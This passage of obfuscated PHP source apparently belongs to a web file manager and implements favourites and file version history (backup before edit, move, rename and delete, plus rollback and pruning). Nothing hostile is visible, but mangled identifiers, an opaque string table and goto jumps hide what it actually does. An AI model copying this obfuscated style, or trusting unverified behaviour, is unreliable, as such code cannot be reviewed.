$_SERVER[£ğ°ÖØø]; $‚••şúÁ = $this->listData(); $¯×¨œˆÁ = array_filter_by_field($‚••şúÁ, $«‚ß¡Ì[33], $«‚ß¡Ì[499]); $¸ ŒÌ©¥ = array_to_keyvalue($¯×¨œˆÁ, $«‚ß¡Ì[12], $«‚ß¡Ì[87]); if (!$¸ ŒÌ©¥) { return $‚••şúÁ; } $Åªº½Ã = 2000; $©óµØ®± = array($«‚ß¡Ì[500] => array($«‚ß¡Ì[501], $¸ ŒÌ©¥)); $ö’á±À = Model($«‚ß¡Ì[888])->listSource($©óµØ®±, $Åªº½Ã); $ö’á±À = array_merge($ö’á±À[$«‚ß¡Ì[86]], $ö’á±À[$«‚ß¡Ì[85]]); $ö’á±À = array_to_keyvalue($ö’á±À, $«‚ß¡Ì[193]); foreach ($‚••şúÁ as $Ü›âşŒ => $¦–ºöÁñ) { $èäûÎ¤ì = $ö’á±À[$¦–ºöÁñ[$«‚ß¡Ì[87]]]; $èäûÎ¤ì = $èäûÎ¤ì ? $èäûÎ¤ì : array(); $‚••şúÁ[$Ü›âşŒ] = array_merge($èäûÎ¤ì, $¦–ºöÁñ); } return $‚••şúÁ; } protected function addFav($‹…ºÏì, $÷¡şğç = '', $´ãúİ¶œ = "\x73\x6f\x75\x72\x63\x65") { $ÒÊ±ûä¸ =& $_SERVER[£ğ°ÖØø]; $ä¥ˆéÊº = array($ÒÊ±ûä¸[1746] => USER_ID, $ÒÊ±ûä¸[566] => 0, $ÒÊ±ûä¸[505] => $´ãúİ¶œ, $ÒÊ±ûä¸[504] => $‹…ºÏì); if ($this->where($ä¥ˆéÊº)->find()) { return !1; } $ä¥ˆéÊº = array($ÒÊ±ûä¸[1746] => USER_ID, $ÒÊ±ûä¸[566] => 0); $—ÓªùŒ· = $this->where($ä¥ˆéÊº)->max($ÒÊ±ûä¸[1978]); if (!$—ÓªùŒ·) { $—ÓªùŒ· = 0; } if (!$÷¡şğç && $´ãúİ¶œ == $ÒÊ±ûä¸[499]) { $ıÚ€Ÿ½ş = Model($ÒÊ±ûä¸[1401])->where(array($ÒÊ±ûä¸[500] => $‹…ºÏì))->find(); if (!$ıÚ€Ÿ½ş) { return !1; } $÷¡şğç = $ıÚ€Ÿ½ş[$ÒÊ±ûä¸[32]]; } $÷¡şğç = $this->getAutoName($÷¡şğç); $»¨³ÚÔô = array($ÒÊ±ûä¸[1746] => USER_ID, $ÒÊ±ûä¸[566] => 0, $ÒÊ±ûä¸[503] => $÷¡şğç, $ÒÊ±ûä¸[504] => $‹…ºÏì, $ÒÊ±ûä¸[505] => $´ãúİ¶œ, $ÒÊ±ûä¸[1958] => $—ÓªùŒ· + 1); return $this->add($»¨³ÚÔô); } protected function remove($¡¦©ä•™) { $êòô¸­ =& $_SERVER[£ğ°ÖØø]; $€ß­óôé = array($êòô¸­[1746] => USER_ID, $êòô¸­[502] => $¡¦©ä•™); return $this->where($€ß­óôé)->delete(); } protected function removeByName($ÃÆ¢Éß÷) { $›ÌÏÛÂğ =& $_SERVER[£ğ°ÖØø]; $¼º¨Şà¿ = array($›ÌÏÛÂğ[1746] => USER_ID, $›ÌÏÛÂğ[503] => $ÃÆ¢Éß÷, $›ÌÏÛÂğ[566] => 0); return $this->where($¼º¨Şà¿)->delete(); } protected function rename($‡»‘ïØÄ, $â¿â) { $ûæ‡ïÍ =& $_SERVER[£ğ°ÖØø]; if ($‡»‘ïØÄ == $â¿â) { return !1; } $™¬œÏÍƒ = $this->getAutoName($â¿â); if ($â¿â != $™¬œÏÍƒ) { return !1; } $¤ôö–µ = array($ûæ‡ïÍ[1746] => USER_ID, $ûæ‡ïÍ[566] => 0, $ûæ‡ïÍ[32] => $‡»‘ïØÄ); return $this->where($¤ôö–µ)->save(array($ûæ‡ïÍ[32] => $â¿â)); } protected function resetSort($ñ³àÆºÀ) { $Ü¿Î×Ã¨ =& $_SERVER[£ğ°ÖØø]; $ñ³àÆºÀ = is_array($ñ³àÆºÀ) ? $ñ³àÆºÀ : array(); $¶ÆĞ·«¿ = array($Ü¿Î×Ã¨[1746] => USER_ID); for ($€â·—Õ­ = 0; $€â·—Õ­ < count($ñ³àÆºÀ); $€â·—Õ­++) { $¶ÆĞ·«¿[$Ü¿Î×Ã¨[502]] = $ñ³àÆºÀ[$€â·—Õ­]; $this->where($¶ÆĞ·«¿)->save(array($Ü¿Î×Ã¨[1958] => $€â·—Õ­ + 1)); } return !0; } protected function moveTop($Í’ó¯œî) { $Œ®ÓÁÕ· =& $_SERVER[£ğ°ÖØø]; $»±—ù¾¿ = array($Œ®ÓÁÕ·[1746] => USER_ID, $Œ®ÓÁÕ·[566] => 0); $İ·£”‡‡ = $this->where($»±—ù¾¿)->where(array($Œ®ÓÁÕ·[32] => $Í’ó¯œî))->find(); if (!$İ·£”‡‡) { return; } $«ïÈµÉ = $this->field($Œ®ÓÁÕ·[484])->where($»±—ù¾¿)->order($Œ®ÓÁÕ·[2432])->select(); $«ïÈµÉ = array_to_keyvalue($«ïÈµÉ, $Œ®ÓÁÕ·[12], $Œ®ÓÁÕ·[484]); $»Ä—€ÇÃ = $«ïÈµÉ; $«ïÈµÉ = array_remove_value($«ïÈµÉ, $İ·£”‡‡[$Œ®ÓÁÕ·[484]]); array_unshift($«ïÈµÉ, $İ·£”‡‡[$Œ®ÓÁÕ·[484]]); return $this->resetSort($«ïÈµÉ); } protected function moveBottom($Ş‹õ Ÿ‡) { $ÌğÄ§Õ =& $_SERVER[£ğ°ÖØø]; $ÈÍı­ü = array($ÌğÄ§Õ[1746] => USER_ID, $ÌğÄ§Õ[566] => 0); $ŞŞ¼°âÁ = $this->where($ÈÍı­ü)->max($ÌğÄ§Õ[1978]); $€‘õ¥“ = array($ÌğÄ§Õ[1978] => $ŞŞ¼°âÁ + 1); return $this->where($ÈÍı­ü)->where(array($ÌğÄ§Õ[32] => $Ş‹õ Ÿ‡))->save($€‘õ¥“); } private function getAutoName($úÙƒ±¢ª) { $µ¸Êä =& $_SERVER[£ğ°ÖØø]; $é¥İŸ = array($µ¸Êä[1746] => USER_ID, $µ¸Êä[566] => 0); $¹ã±Ù¯˜ = $this->field($µ¸Êä[32])->where($é¥İŸ)->select(); $¹ã±Ù¯˜ = array_to_keyvalue($¹ã±Ù¯˜, $µ¸Êä[12], $µ¸Êä[32]); if (!$¹ã±Ù¯˜ || !in_array($úÙƒ±¢ª, $¹ã±Ù¯˜)) { return $úÙƒ±¢ª; } for ($¦¼É¯§é = 0; $¦¼É¯§é < count($¹ã±Ù¯˜); $¦¼É¯§é++) { if (!in_array($úÙƒ±¢ª . "\x28{$¦¼É¯§é}\51", $¹ã±Ù¯˜)) { return $úÙƒ±¢ª . "\x28{$¦¼É¯§é}\x29"; } } return $úÙƒ±¢ª . "\50{$¦¼É¯§é}\x29"; } } goto DÌ‹µ±¨¥…; D·­Š§‡¬Á: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $‚ıØÄÒõ =& $_SERVER[£ğ°ÖØø]; $öˆÎ¹ = $GLOBALS[$‚ıØÄÒõ[6]][$‚ıØÄÒõ[92]]; if ($öˆÎ¹[$‚ıØÄÒõ[1284]] != 1) { return; } if ($öˆÎ¹[$‚ıØÄÒõ[1285]] <= 0) { return; } if (isset($_REQUEST[$‚ıØÄÒõ[1286]]) && $_REQUEST[$‚ıØÄÒõ[1286]] == $‚ıØÄÒõ[91]) { return; } Hook::bind($‚ıØÄÒõ[1287], $‚ıØÄÒõ[1288]); Hook::bind($‚ıØÄÒõ[1289], $‚ıØÄÒõ[1290]); Hook::bind($‚ıØÄÒõ[1291], $‚ıØÄÒõ[1292]); Hook::bind($‚ıØÄÒõ[1293], $‚ıØÄÒõ[1294]); Hook::bind($‚ıØÄÒõ[1295], $‚ıØÄÒõ[1296]); Hook::bind($‚ıØÄÒõ[1297], $‚ıØÄÒõ[1298]); } public static function eventBeforeUpload($×ûÈ€Ş½) { if ($×ûÈ€Ş½[3] && $×ûÈ€Ş½[3] != REPEAT_REPLACE) { return; } $½ÔÖ¦¼ = self::parsePath($×ûÈ€Ş½[0]); if (!$½ÔÖ¦¼) { return; } self::add($½ÔÖ¦¼); } public static function eventBeforeEdit($ê®ïİä¤) { $Ÿ¾°°™ = self::parsePath($ê®ïİä¤[0]); if (!$Ÿ¾°°™) { return; } self::add($Ÿ¾°°™); } public static function eventBeforeCopyFile($Ì»‰¿€¦, $Í¾Âüı, $„¶¼Éµı, $ñİ®æà, $›é³òÌ, $®í“ŒŞ) { $ü·Ä¤Ò° =& $_SERVER[£ğ°ÖØø]; if (isset($„¶¼Éµı->_data[$ü·Ä¤Ò°[1219]]) && $„¶¼Éµı->_data[$ü·Ä¤Ò°[1219]]) { return; } $íŸ©Ğ°’ = $„¶¼Éµı->getPathOuter($ñİ®æà); $™ˆú¾®ø = self::parsePath($íŸ©Ğ°’); if (!$™ˆú¾®ø) { return; } self::add($™ˆú¾®ø); } public static function eventBeforeRename($÷ªê‚‰Ï) { $İëÄ üô =& $_SERVER[£ğ°ÖØø]; $üÕƒåÆ‚ = self::parsePath($÷ªê‚‰Ï[0]); if (!$üÕƒåÆ‚) { return; } $§ˆ…ª–Š = self::checkInHistory($üÕƒåÆ‚); if (!$§ˆ…ª–Š) { return; } if ($§ˆ…ª–Š[$İëÄ üô[33]] == $İëÄ üô[230]) { $—“Ø‰à’ = self::listData($üÕƒåÆ‚); if ($—“Ø‰à’ && $—“Ø‰à’[$İëÄ üô[454]]) { self::moveHistory($üÕƒåÆ‚, $÷ªê‚‰Ï[1]); } } else { IO::rename($§ˆ…ª–Š[$İëÄ üô[87]], $÷ªê‚‰Ï[1]); } } public static function eventBeforeMove($”Õì¯‚§) { $••ñ³Ğ‚ =& $_SERVER[£ğ°ÖØø]; $œÙ¡óºÓ = self::parsePath($”Õì¯‚§[0]); if (!$œÙ¡óºÓ) { return; } $»ÕŒÛÊ• = self::parsePath($”Õì¯‚§[1]); if (!$»ÕŒÛÊ•) { return; } $´ùÔí©Ä = $”Õì¯‚§[3]; $ƒ‰õÛ = self::checkInHistory($œÙ¡óºÓ); if (!$ƒ‰õÛ) { return; } $Ù”Éä™ø = self::pathHistory($»ÕŒÛÊ•); if ($ƒ‰õÛ[$••ñ³Ğ‚[33]] == $••ñ³Ğ‚[230]) { $·¾Ûí¾ = self::listData($œÙ¡óºÓ); $•°”å…· = rtrim($»ÕŒÛÊ•, $••ñ³Ğ‚[8]) . $••ñ³Ğ‚[8] . ($´ùÔí©Ä ? $´ùÔí©Ä : get_path_this($œÙ¡óºÓ)); $Ç¢ÚÌò = self::listData($•°”å…·); if ($·¾Ûí¾ && $·¾Ûí¾[$••ñ³Ğ‚[454]] && $Ç¢ÚÌò && $Ç¢ÚÌò[$••ñ³Ğ‚[454]]) { return self::clear($œÙ¡óºÓ); } if ($·¾Ûí¾ && $·¾Ûí¾[$••ñ³Ğ‚[454]]) { self::moveHistory($œÙ¡óºÓ, $´ùÔí©Ä, $Ù”Éä™ø); } } else { IO::move($ƒ‰õÛ[$••ñ³Ğ‚[87]], $Ù”Éä™ø, !1, $´ùÔí©Ä); self::clearEmptyFolder(IO::pathFather($ƒ‰õÛ[$••ñ³Ğ‚[87]])); } } public static function eventAfterRemove($áÁ£€Öä, $±†Ş‘) { $áêùÖé€ =& $_SERVER[£ğ°ÖØø]; if (!$±†Ş‘) { return; } $ë­Éû´× = self::parsePath($áÁ£€Öä[0]); if (!$ë­Éû´×) { return; } $å«”Ô˜ = self::checkInHistory($ë­Éû´×); if (!$å«”Ô˜) { return; } if ($å«”Ô˜[$áêùÖé€[33]] == $áêùÖé€[230]) { $°›àè ş = self::listData($ë­Éû´×, !1); if ($°›àè ş && $°›àè ş[$áêùÖé€[454]]) { self::clear($ë­Éû´×, !1); } } else { IO::remove($å«”Ô˜[$áêùÖé€[87]]); self::clearEmptyFolder(IO::pathFather($å«”Ô˜[$áêùÖé€[87]])); } } private static function checkInHistory($Ÿ­ƒ Ÿ¹) { $×¤Å›¼Ê = self::pathHistory($Ÿ­ƒ Ÿ¹); if (!IO::exist($×¤Å›¼Ê)) { $×¤Å›¼Ê .= $_SERVER[£ğ°ÖØø][1299]; } return IO::exist($×¤Å›¼Ê) ? IO::info($×¤Å›¼Ê) : !1; } private static function parsePath($ÑÁÙ“é½) { $µµúˆè =& $_SERVER[£ğ°ÖØø]; if (!$ÑÁÙ“é½) { return !1; } if (isset($GLOBALS[$µµúˆè[1300]]) && $GLOBALS[$µµúˆè[1300]]) { return; } $‹üîÖ…ì = KodIO::parse($ÑÁÙ“é½); $¿Ô²Á = $‹üîÖ…ì[$µµúˆè[33]]; $™¢×ÛÌ¨ = !$¿Ô²Á || $¿Ô²Á == KodIO::KOD_IO || $¿Ô²Á == KodIO::KOD_SHARE_ITEM; if (!$™¢×ÛÌ¨ || !$‹üîÖ…ì[$µµúˆè[1301]]) { return !1; } if (substr($ÑÁÙ“é½, 0, strlen(DATA_PATH . $µµúˆè[1302])) == DATA_PATH . $µµúˆè[1302]) { return !1; } if ($¿Ô²Á == KodIO::KOD_SHARE_ITEM) { $Ú’½ëğÒ = IO::init($ÑÁÙ“é½); if ($Ú’½ëğÒ->pathParse[$µµúˆè[1215]]) { return self::parsePath($Ú’½ëğÒ->pathParse[$µµúˆè[1215]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $«÷õÁù¿ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $µµúˆè[1303]); foreach ($«÷õÁù¿ as $ÄÕôÕ›¢) { if (!$¿Ô²Á && substr($ÑÁÙ“é½, 0, strlen($ÄÕôÕ›¢)) == $ÄÕôÕ›¢) { return !1; } } self::log($GLOBALS[$µµúˆè[1210]] . $µµúˆè[1304] . $ÑÁÙ“é½); return $ÑÁÙ“é½; } private static function pathHistory($·‹‰Î³ë) { $Šèê¡¬ş =& $_SERVER[£ğ°ÖØø]; $Ü¹±ËÍ‰ = self::$_historyBase . ltrim(KodIO::clear($·‹‰Î³ë), $Šèê¡¬ş[8]); $Ü¹±ËÍ‰ = str_replace(array($Šèê¡¬ş[1305]), array($Šèê¡¬ş[1306]), $Ü¹±ËÍ‰); return $Ü¹±ËÍ‰; } public static function log($·½³³Ï) { } public static function historyCount($„¬âÕáé) { $Ş¹·á¸¢ =& $_SERVER[£ğ°ÖØø]; $Í‰Ê®ÖŠ = array(); $æ÷º”ƒ = array(); foreach ($„¬âÕáé as $äğîñÕú) { $›™˜Üòö = get_path_father($äğîñÕú); if (!$æ÷º”ƒ[$›™˜Üòö]) { $æ÷º”ƒ[$›™˜Üòö] = array(); } $æ÷º”ƒ[$›™˜Üòö][] = get_path_this($äğîñÕú); } foreach ($æ÷º”ƒ as $›™˜Üòö => $ê˜¯ó¿¥) { $¨°¦•İ = self::parsePath($›™˜Üòö); if (!$¨°¦•İ) { continue; } foreach ($ê˜¯ó¿¥ as $ŒŸ·´±) { $µ£şúõ‡ = self::listData(rtrim($¨°¦•İ, $Ş¹·á¸¢[8]) . $Ş¹·á¸¢[8] . $ŒŸ·´±, !1); if ($µ£şúõ‡ && $µ£şúõ‡[$Ş¹·á¸¢[454]]) { $Í‰Ê®ÖŠ[rtrim($›™˜Üòö, $Ş¹·á¸¢[8]) . $Ş¹·á¸¢[8] . $ŒŸ·´±] = count($µ£şúõ‡[$Ş¹·á¸¢[454]]); } } } return $Í‰Ê®ÖŠ; } public static function add($æî¡‰¡³) { $Íı½ÂŒ =& $_SERVER[£ğ°ÖØø]; $È¥×ä¾¢ = self::listData($æî¡‰¡³); if (!$È¥×ä¾¢) { return; } $ÕŞÃ²à = Model($Íı½ÂŒ[834])->get($Íı½ÂŒ[1307]); $˜öşÁ­† = intval($GLOBALS[$Íı½ÂŒ[6]][$Íı½ÂŒ[92]][$Íı½ÂŒ[1285]]); $äŸ»¢›¶ = $ÕŞÃ²à == $Íı½ÂŒ[1308] ? min(5, $˜öşÁ­†) : $˜öşÁ­†; if ($˜öşÁ­† <= 0) { return; } $“½åí = IO::info($æî¡‰¡³); $Ÿç°âó« = $È¥×ä¾¢[$Íı½ÂŒ[454]]; if ($“½åí[$Íı½ÂŒ[79]] == 0) { return; } if ($“½åí[$Íı½ÂŒ[79]] >= 1024 * 1024 * 500) { return !1; } $Ÿ‘¡×® = IO::hashSimple($æî¡‰¡³); if ($Ÿç°âó« && $Ÿç°âó«[0][$Íı½ÂŒ[681]] == $Ÿ‘¡×®) { return !0; } if (array_key_exists($Íı½ÂŒ[233], $“½åí) && !$“½åí[$Íı½ÂŒ[233]]) { return !1; } $²æäÎ¨Û = short_id(time()); $§ƒŠğ¿³ = array($Íı½ÂŒ[484] => $²æäÎ¨Û, $Íı½ÂŒ[681] => $Ÿ‘¡×®, $Íı½ÂŒ[32] => $“½åí[$Íı½ÂŒ[32]] . $Íı½ÂŒ[10] . date($Íı½ÂŒ[1309]) . rand_string(1), $Íı½ÂŒ[79] => $“½åí[$Íı½ÂŒ[79]], $Íı½ÂŒ[536] => USER_ID, $Íı½ÂŒ[231] => time(), $Íı½ÂŒ[1310] => $Íı½ÂŒ[12]); IO::mkdir($È¥×ä¾¢[$Íı½ÂŒ[1311]]); $úˆéûå³ = IO::copy($æî¡‰¡³, $È¥×ä¾¢[$Íı½ÂŒ[1311]], !1, $§ƒŠğ¿³[$Íı½ÂŒ[32]]); if (!$úˆéûå³) { self::clearEmptyFolder($È¥×ä¾¢[$Íı½ÂŒ[1311]]); return !1; } array_unshift($Ÿç°âó«, $§ƒŠğ¿³); if (count($Ÿç°âó«) > $äŸ»¢›¶) { $ø …¯¥Ì = array_slice($Ÿç°âó«, $äŸ»¢›¶); foreach ($ø …¯¥Ì as $Ä—¥ Ğ„) { IO::remove($È¥×ä¾¢[$Íı½ÂŒ[1311]] . $Ä—¥ Ğ„[$Íı½ÂŒ[32]]); } $Ÿç°âó« = array_slice($Ÿç°âó«, 0, $äŸ»¢›¶); } return self::saveData($È¥×ä¾¢[$Íı½ÂŒ[1312]], $Ÿç°âó«); } public static function remove($ÈáÔåªˆ, $¶Ï’®üÆ) { $ ­´Ñ¡ =& $_SERVER[£ğ°ÖØø]; $Ò¿Ññ¢Ë = self::listData($ÈáÔåªˆ); $ß…Œ€›Õ = array(); if (!$Ò¿Ññ¢Ë) { return !1; } foreach ($Ò¿Ññ¢Ë[$ ­´Ñ¡[454]] as $°ä‚¢ÕÆ) { if ($°ä‚¢ÕÆ[$ ­´Ñ¡[484]] == $¶Ï’®üÆ) { IO::remove($Ò¿Ññ¢Ë[$ ­´Ñ¡[1311]] . $°ä‚¢ÕÆ[$ ­´Ñ¡[32]]); continue; } $ß…Œ€›Õ[] = $°ä‚¢ÕÆ; } return self::saveData($Ò¿Ññ¢Ë[$ ­´Ñ¡[1312]], $ß…Œ€›Õ); } public static function clear($òíÚæÄ¶, $Ï¥ôĞ÷– = true) { $¿ÆæçÏ =& $_SERVER[£ğ°ÖØø]; $ÖÖÑÒÂˆ = self::listData($òíÚæÄ¶, $Ï¥ôĞ÷–); if (!$ÖÖÑÒÂˆ) { return !1; } foreach ($ÖÖÑÒÂˆ[$¿ÆæçÏ[454]] as $øËÓ²ÕÎ) { IO::remove($ÖÖÑÒÂˆ[$¿ÆæçÏ[1311]] . $øËÓ²ÕÎ[$¿ÆæçÏ[32]]); } return self::saveData($ÖÖÑÒÂˆ[$¿ÆæçÏ[1312]], array()); } public static function moveHistory($Ìºù €†, $Ãç‚œ = '', $°‰ŸŸØœ = '') { $±‡—±Ë˜ =& $_SERVER[£ğ°ÖØø]; $À¼Ğ‹ÍÏ = self::listData($Ìºù €†, !1); if (!$À¼Ğ‹ÍÏ || !$À¼Ğ‹ÍÏ[$±‡—±Ë˜[454]]) { return !1; } $İ±ó¿ª = $±‡—±Ë˜[1299]; $Ãç‚œ = $Ãç‚œ ? $Ãç‚œ : get_path_this($Ìºù €†); $°‰ŸŸØœ = $°‰ŸŸØœ ? $°‰ŸŸØœ : $À¼Ğ‹ÍÏ[$±‡—±Ë˜[1311]]; $¦µ»›áª = substr(get_path_this($À¼Ğ‹ÍÏ[$±‡—±Ë˜[1312]]), 0, -strlen($İ±ó¿ª)); foreach ($À¼Ğ‹ÍÏ[$±‡—±Ë˜[454]] as $æŸ±•·” => $ÖÛÂ•£Ñ) { $¦Şæ›âû = $Ãç‚œ . substr($ÖÛÂ•£Ñ[$±‡—±Ë˜[32]], strlen($¦µ»›áª)); $ÈİÇè€¤ = IO::move($À¼Ğ‹ÍÏ[$±‡—±Ë˜[1311]] . $ÖÛÂ•£Ñ[$±‡—±Ë˜[32]], $°‰ŸŸØœ, !1, $¦Şæ›âû); if ($ÈİÇè€¤) { $À¼Ğ‹ÍÏ[$±‡—±Ë˜[454]][$æŸ±•·”][$±‡—±Ë˜[32]] = $¦Şæ›âû; } } $À¼Ğ‹ÍÏ[$±‡—±Ë˜[1312]] = IO::move($À¼Ğ‹ÍÏ[$±‡—±Ë˜[1312]], $°‰ŸŸØœ, !1, $Ãç‚œ . $İ±ó¿ª); self::saveData($À¼Ğ‹ÍÏ[$±‡—±Ë˜[1312]], $À¼Ğ‹ÍÏ[$±‡—±Ë˜[454]]); self::clearEmptyFolder($À¼Ğ‹ÍÏ[$±‡—±Ë˜[1311]]); } public static function rollback($ö¬âØäØ, $«Äš°) { $¢ªï®‰° =& $_SERVER[£ğ°ÖØø]; $Ä´å“Üç = self::listData($ö¬âØäØ); if (!$Ä´å“Üç) { return; } $¾…îœ²ª = IO::info($ö¬âØäØ); foreach ($Ä´å“Üç[$¢ªï®‰°[454]] as $™­ñÙ¢ => $®ŠÊš¯ú) { if ($®ŠÊš¯ú[$¢ªï®‰°[484]] == $«Äš°) { self::add($ö¬âØäØ); $­Œš¹ – = $Ä´å“Üç[$¢ªï®‰°[1311]] . $®ŠÊš¯ú[$¢ªï®‰°[32]]; $ÈªÆÙ¡ = IO::copy($­Œš¹ –, IO::pathFather($ö¬âØäØ), REPEAT_REPLACE, $¾…îœ²ª[$¢ªï®‰°[32]]); if ($ÈªÆÙ¡) { self::remove($ö¬âØäØ, $«Äš°); } return $ÈªÆÙ¡; } } return !1; } public static function setDetail($éñ…­úî, $ŒÄö‘”µ, $‘¤á†¢ ) { $ïë·œÒá =& $_SERVER[£ğ°ÖØø]; $ŒÇó«¯ = self::listData($éñ…­úî); if (!$ŒÇó«¯) { return; } foreach ($ŒÇó«¯[$ïë·œÒá[454]] as $¥Üáøàİ => $üÓœ•¤ø) { if ($üÓœ•¤ø[$ïë·œÒá[484]] == $ŒÄö‘”µ) { $ŒÇó«¯[$ïë·œÒá[454]][$¥Üáøàİ][$ïë·œÒá[1310]] = $‘¤á†¢ ; self::saveData($ŒÇó«¯[$ïë·œÒá[1312]], $ŒÇó«¯[$ïë·œÒá[454]]); return !0; } } return !1; } public static function fileInfo($Öğç¡×†, $§—¤ÎŠŒ) { $Ïİğ­Õ =& $_SERVER[£ğ°ÖØø]; $´Ä»õÍô = self::listData($Öğç¡×†); if (!$´Ä»õÍô) { show_json(LNG($Ïİğ­Õ[108]), !1); } $†“Ë¹¢ = $Ïİğ­Õ[12]; foreach ($´Ä»õÍô[$Ïİğ­Õ[454]] as $óñşåÎ => $ÔÍØ™å¡) { if ($ÔÍØ™å¡[$Ïİğ­Õ[484]] != $§—¤ÎŠŒ) { continue; } $†“Ë¹¢ = $´Ä»õÍô[$Ïİğ­Õ[1311]] . $ÔÍØ™å¡[$Ïİğ­Õ[32]]; break; } if (!$†“Ë¹¢) { show_json(LNG($Ïİğ­Õ[108]), !1); } return IO::info($†“Ë¹¢); } public static function fileOut($úç€Õ¤, $¾É¿ğìÃ, $ï¸ô±¿Î = false) { $¿¹¾ªÏ… =& $_SERVER[£ğ°ÖØø]; $èÕï–ìÜ = self::fileInfo($úç€Õ¤, $¾É¿ğìÃ); $É—ğ§ä¡ =& $GLOBALS[$¿¹¾ªÏ…[7]]; $ï¸ô±¿Î = isset($É—ğ§ä¡[$¿¹¾ªÏ…[1262]]) && $É—ğ§ä¡[$¿¹¾ªÏ…[1262]] == 1; if (isset($É—ğ§ä¡[$¿¹¾ªÏ…[33]]) && $É—ğ§ä¡[$¿¹¾ªÏ…[33]] == $¿¹¾ªÏ…[1313]) { return IO::fileOutImage($èÕï–ìÜ[$¿¹¾ªÏ…[87]], $É—ğ§ä¡[$¿¹¾ªÏ…[1314]]); } IO::fileOut($èÕï–ìÜ[$¿¹¾ªÏ…[87]], $ï¸ô±¿Î, get_path_this($úç€Õ¤)); } public static function listData($¤‰Îï°±, $î´ùÁ‹ï = true) { $“Ñ«Ğ =& $_SERVER[£ğ°ÖØø]; if ($î´ùÁ‹ï && !IO::exist($¤‰Îï°±)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($¤‰Îï°±, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $©†øØ¸ = self::pathHistory($¤‰Îï°±); $µ§§áŠè = array($“Ñ«Ğ[1312] => $©†øØ¸ . $“Ñ«Ğ[1299], $“Ñ«Ğ[1311] => rtrim(get_path_father($©†øØ¸), $“Ñ«Ğ[8]) . $“Ñ«Ğ[8], $“Ñ«Ğ[454] => array()); $éñ¬Ã´› = IO::getContent($µ§§áŠè[$“Ñ«Ğ[1312]]); if ($éñ¬Ã´›) { $ºŸş÷Ş§ = json_decode($éñ¬Ã´›, !0); if (is_array($ºŸş÷Ş§)) { $µ§§áŠè[$“Ñ«Ğ[454]] = $ºŸş÷Ş§; } } return $µ§§áŠè; } private static function saveData($¾Ÿì²Ï, $¤¸Êƒ) { $¿÷ÁÕ¿ =& $_SERVER[£ğ°ÖØø]; self::log($¿÷ÁÕ¿[1315] . $¾Ÿì²Ï . $¿÷ÁÕ¿[74] . count($¤¸Êƒ), $¿÷ÁÕ¿[816]); if ($¤¸Êƒ) { return IO::setContent($¾Ÿì²Ï, json_encode($¤¸Êƒ)); } $½çªš¯ = IO::pathFather($¾Ÿì²Ï); IO::remove($¾Ÿì²Ï); self::clearEmptyFolder($½çªš¯); return !0; } public static function clearEmptyFolder($¾Ğ¸Ğ») { $ëªÜõíƒ =& $_SERVER[£ğ°ÖØø]; if (trim($¾Ğ¸Ğ», $ëªÜõíƒ[8]) == trim(self::$_historyBase, $ëªÜõíƒ[8])) { return; } $ÆÙ·àş = IO::pathFather($¾Ğ¸Ğ»); $ÆÉÌ³ë = IO::has($¾Ğ¸Ğ», !0); if ($ÆÉÌ³ë[$ëªÜõíƒ[239]] > 0 || $ÆÉÌ³ë[$ëªÜõíƒ[240]] > 0) { return; } IO::remove($¾Ğ¸Ğ»); self::clearEmptyFolder($ÆÙ·àş); } private static function getBasePath() { $Ë¾±ãÏµ =& $_SERVER[£ğ°ÖØø]; $ß¸Şö€Ô = Model($Ë¾±ãÏµ[1316])->get($Ë¾±ãÏµ[1317]); if ($ß¸Şö€Ô) { if (!IO::exist($ß¸Şö€Ô)) { IO::mkdir($ß¸Şö€Ô); } if (get_path_this($ß¸Şö€Ô) == $Ë¾±ãÏµ[1302]) { $–ªçÓı¡ = $Ë¾±ãÏµ[1318] . rand_string(8); @rename($ß¸Şö€Ô, get_path_father($ß¸Şö€Ô) . $Ë¾±ãÏµ[8] . $–ªçÓı¡); $ß¸Şö€Ô = DATA_PATH . $–ªçÓı¡ . $Ë¾±ãÏµ[8]; file_put_contents(DATA_PATH . $Ë¾±ãÏµ[1249], $Ë¾±ãÏµ[12]); Model($Ë¾±ãÏµ[1316])->set($Ë¾±ãÏµ[1317], $ß¸Şö€Ô); } return $ß¸Şö€Ô; } $ß¸Şö€Ô = DATA_PATH . $Ë¾±ãÏµ[1318] . rand_string(8) . $Ë¾±ãÏµ[8]; $ß¸Şö€Ô = IO::mkdir($ß¸Şö€Ô); $ß¸Şö€Ô = rtrim($ß¸Şö€Ô, $Ë¾±ãÏµ[8]) . $Ë¾±ãÏµ[8]; file_put_contents($ß¸Şö€Ô . $Ë¾±ãÏµ[1249], $Ë¾±ãÏµ[12]); file_put_contents(DATA_PATH . $Ë¾±ãÏµ[1249], $Ë¾±ãÏµ[12]); Model($Ë¾±ãÏµ[1316])->set($Ë¾±ãÏµ[1317], $ß¸Şö€Ô); return $ß¸Şö€Ô; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\162\143\145\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\x73\x65\x72\x52\x65\x63\x79\x63\154\145\175"; const KOD_USER_FAV = "\173\165\163\x65\162\x46\x61\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\145\162\106\151\154\145\124\141\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\x65\162\106\151\154\x65\124\171\160\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\x6f\165\160\x52\x6f\157\x74\123\x65\154\x66\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\145\162\x53\x68\141\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\x73\145\162\123\x68\141\x72\x65\x4c\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\173\163\150\x61\x72\145\x54\x6f\x4d\145\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\x61\x72\x65\111\164\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\x72\145\x49\164\145\x6d\x4c\x69\156\153\175"; const KOD_SEARCH = "\x7b\163\x65\x61\162\143\x68\x7d"; const KOD_BLOCK = "\173\142\x6c\x6f\143\x6b\x7d"; const KOD_IO = "\173\x69\x6f\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\x65\x72\x52\x65\x6e\143\145\156\164\x7d"; const KOD_USER_DRIVER = 